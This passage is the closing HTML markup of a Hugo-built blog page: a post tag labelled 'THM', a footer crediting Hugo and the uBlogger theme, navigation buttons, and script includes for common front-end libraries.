33.9.0L369.9 273c9.4-9.4 9.4-24.6.0-34z"/></svg></span></a></div></div></div></div></div><div id=toc-final></div></article><div class="post-tags post-tags-toc"><a href=/tags/thm/ class=tag>THM</a></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.79.1">Hugo</a> | Theme - <a href="https://ublogger.netlify.app/?utm_source=https://www.masoopy.com/&utm_medium=footer&utm_campaign=config&utm_term=1.2.0" target=_blank title="uBlogger 1.2.0"><i class="fas fa-pencil-alt fa-fw"></i>uBlogger</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span>2022</span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i></a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script src=/lib/smooth-scroll/smooth-scroll.min.js></script><script src=/lib/lazysizes/lazysizes.min.js></script><script src=/lib/clipboard/clipboard.min.js></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10}};</script><script src=/js/theme.min.js></script><script src=/js/jquery-3.5.1.min.js></script></body></html>